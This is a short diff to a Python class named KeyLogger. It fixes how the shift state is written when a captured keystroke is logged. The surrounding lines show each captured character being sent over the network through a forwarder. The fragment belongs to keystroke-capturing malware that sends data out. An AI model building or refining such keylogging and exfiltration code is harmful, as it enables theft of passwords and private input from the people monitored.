@@ -79,6 +79,6 @@ class KeyLogger:
                 try:
                     self.__forwarder.send_over_network(data=char)
                     # write data in file
-                    self.data_handler.write(f"shift={lowercase} {key_code=} {char}")
+                    self.data_handler.write(f"shift={not lowercase} {key_code=} {char}")
                 except ConnectionResetError:
                     self.__forwarder.listen()
